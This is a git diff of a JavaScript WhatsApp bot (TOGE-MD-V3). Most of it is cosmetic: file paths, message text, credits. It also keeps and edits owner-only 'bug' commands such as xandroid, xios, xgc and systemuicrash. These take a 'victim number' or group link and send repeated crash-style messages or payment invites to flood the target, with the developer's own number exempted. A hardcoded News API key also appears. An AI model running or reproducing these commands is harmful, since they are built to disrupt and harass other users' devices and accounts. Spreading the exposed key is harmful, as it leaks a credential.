@@ -3792,7 +3877,7 @@ Maria.sendMessage(from, {text:  `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw
 if (!AntiNsfw) return reply('Already deactivated')
 let off = isnsfw.indexOf(from)
 isnsfw.splice(off, 1)
-fs.writeFileSync('./Media/database/nsfw.json', JSON.stringify(isnsfw))
+fs.writeFileSync('./database/nsfw.json', JSON.stringify(isnsfw))
 reply('Successfully deactivating nsfw mode in this group ✔️')
 } else {
   await reply(`*Kindly input the choice as follows:*
@@ -4076,7 +4161,7 @@ case 'zero-two': {
 			if (!quoted) return reply(`Where is the picture?`)
 			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
 			reply(mess.wait)
-			const { remini } = require('./Media/lib/remini')
+			const { remini } = require('./lib/remini')
 			let media = await quoted.download()
 			let proses = await remini(media, "enhance")
 			Maria.sendMessage(m.chat, { image: proses, caption: mess.done}, { quoted: m})
@@ -4133,7 +4218,7 @@ case 'hidetag': {
       case 'img': {
       if (!args.join(" ")) return reply(`🧩${pushname}Please provide a search term!`);
         reply(mess.waiting)
-        let { pinterest } = require('./Gallery/lib/scraper');
+        let { pinterest } = require('./lib/scraper');
         let anutrest = await pinterest(text);
         let results = [];
 
@@ -4329,7 +4414,7 @@ case 'welcome':
 
 
 case 'git': case 'gitclone':
-if (!text) return reply(`🧩Where is the link?\n🔮Example :\n${prefix}${command} https://github.com/toge012345/TOGE-MD-V3 `)
+if (!text) return reply(`🧩Where is the link?\nExample :\n${prefix}${command} https://github.com/toge012345/TOGE-MD-V3 `)
 if (!isUrl(text) && !text.includes('github.com')) return reply(`Link invalid!!`)
     let repo = text.split('/');
     let url = `https://api.github.com/repos/${repo[3]}/${repo[4]}/zipball`
@@ -4353,7 +4438,7 @@ case 'telestick': case 'tgs':{
 				Maria.sendMessage(m.chat, { sticker: { url: mariaresources[i].url }})
 			}
 		}
-	} else reply(`🧩Telegram sticker Link??\n🔮Example. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
+	} else reply(`Telegram sticker Link??\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
 }
 break;
 
@@ -4385,7 +4470,7 @@ case 'naturetypography':
 case 'quotesunder':
 case 'shinetext':{
 
-if (!q) return reply(`🔮Example : ${prefix+command} toge`) 
+if (!q) return reply(`Example : ${prefix+command} toge`) 
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
 if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
@@ -4507,10 +4592,7 @@ case 'ping':
   case 'mods':
 case 'developer':
 case 'dev':
-    const devmod = `  🍥 *Moderators* 🍥\n\n
-*🎫TOGE INUMAKI* @24105114159
-\n
-\n📛*Don't Spam them to avoid Blocking !*\n\n For any help, type *${prefix}support* and ask in the group.\n\n*✨️Thanks for using TOGE-MD-V3* `;
+    const devmod = `  𝚑𝚒 𝚖𝚢 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚒𝚜 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚑𝚎𝚛𝚎 𝚊𝚛𝚎 𝚝𝚑𝚎𝚒𝚛 𝚗𝚞𝚖𝚋𝚎𝚛𝚜 @24105114159`;
 
     Maria.sendMessage(m.chat, { text: devmod, mentions: ["24105114159@s.whatsapp.net", "24105114159@s.whatsapp.net", "24105114159@s.whatsapp.net","24102150169@s.whatsapp.net"] }, { quoted: m });
     break;
@@ -4897,15 +4979,15 @@ async function fetchRandomScienceFact() {
 			    
 //bug cases
 case "xandroid": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
-    return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
@@ -4915,9 +4997,9 @@ case "xandroid": {
     return;
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -4929,15 +5011,15 @@ case "xandroid": {
 }
 break;
 case "xios": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
-    return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
@@ -4947,9 +5029,9 @@ case "xios": {
     return;
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -4959,18 +5041,19 @@ case "xios": {
     [whatsappNumber]
   );
 }
-break;
+break
+	
 case "xios2":
   {
-	if (!isCreator) return replay(mess.botowner);
+	if (!isCreator) return reply(mess.owner);
     if (!isBot) {
-      return replay("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
+      return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
     }
     if (!text){
-      return replay(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
+      return reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
       }
     if (isNaN(parseInt(text))) {
-      return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+      return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
@@ -4979,18 +5062,19 @@ case "xios2":
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
-  break;
+  break
+	
   case "xandroid2":
   {
-	if (!isCreator) return replay(mess.botowner);
+	if (!isCreator) return reply(mess.owner);
     if (!isBot) {
-      return replay("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
+      return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
     }
     if (!text){
-      return replay(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
+      return reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
       }
     if (isNaN(parseInt(text))) {
-      return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+      return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
@@ -4999,16 +5083,16 @@ case "xios2":
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
-  break;
-  case "xgc":
-  {
-    if (!isCreator) return replay(mess.botowner);
+  break
+	
+  case "xgc": {
+    if (!isCreator) return reply(mess.owner)
     if (!text) {
-      return replay("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
+      return reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
     }
-    replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
     if (!text.split(" ")[0].includes("whatsapp.com")) {
-      return replay("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉");
+      return reply("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉");
     }
     let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
     try {
@@ -5017,35 +5101,36 @@ case "xios2":
       await sleep(2000); // Adjusted sleep time for clarity
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
-      replay("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿");
+      reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿");
       XeonBotInc.groupLeave(groupTarget);
     } catch (error) {
-      replay(util.format(error));
+      reply(util.format(error));
     }
   }
-  break;
+  break
+	
   case "systemuicrash": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
-    return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
   if (cleanedNumber == "24105114159") {
-    return;
+    return
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -5055,14 +5140,15 @@ case "xios2":
     [whatsappNumber]
   );
 }
-break;
+break
+
 case "xsysui": {
-  if (!isCreator) return replay(mess.botowner);
-  if (!text) return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!isCreator) return reply(mess.owner);
+  if (!text) return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replay(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+    return reply(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replay("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
@@ -5075,9 +5161,9 @@ case "xsysui": {
     return;
   }
   if (contactInfo.length == 0) {
-    return replay("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
+    return reply("𝕿𝖍𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 𝖎𝖘 𝖓𝖔𝖙 𝖗𝖊𝖌𝖎𝖘𝖙𝖊𝖗𝖊𝖉 𝖔𝖓 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕");
   }
-  replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+  reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -5087,15 +5173,14 @@ case "xsysui": {
     [whatsappNumber]
   );
 }
-break;
+break
+	
 case 'clearall': {
-if (!isCreator) return replay(mess.botowner);
+if (!isCreator) return replay(mess.owner);
 XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
 }
-break
-case 'clearchat':
-xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
-break
+break;
+		
 // Function to fetch the latest science news headlines using the News API
 async function fetchScienceNewsHeadlines() {
     const apiKey = 'bf17483564e24e2aa83ff6dc6a8e79eb'; // Provided News API key
@@ -5157,12 +5242,8 @@ case "info":
 ❁ ═══ ❃•📕 *INFORMATION*📕•❃ ═══ ❁
 \`\`\`A simple and easy-to-use WhatsApp bot project based on Multi-Device Baileys and written in JavaScript\`\`\`
 
-❁ ══════ ❃•📄 *NOTE* 📄•❃ ══════ ❁
-\`\`\`This bot is a free open source project by THE TEAM AYUSH\`\`\`
-
 ❁ ═════ ❃•📑 *GITHUB* 📑•❃ ═════ ❁
-*_LINK:- https://github.com/AYUSH-PANDEY023/Maria-MD_*
-
+*_LINK:- https://github.com/toge012345/TOGE-MD-V3_*
 
 ❁ ═══ ❃•✍🏻 *CONTRIBUTE* ✍🏻•❃ ═══ ❁
 \`\`\`Feel free to open issues regarding any problems or if you have any feature feel free to contact owner by typing ${prefix}owner or ${prefix}mods`
@@ -5195,7 +5276,7 @@ _If you have any questions regarding our terms, please reach out to us._
 _For everything else, use common sense._
 
 *FUTURE IS NOW🚀~TOGE-MD-V3*
-*_🚀Team TOGE-BOT_*
+*_🚀TOGE-BOT_*
 
 ⍟ *────────────────* ⍟`
  let mariajpg= "https://telegra.ph/file/5c831c160ad93ad5c1bc7.jpg" 
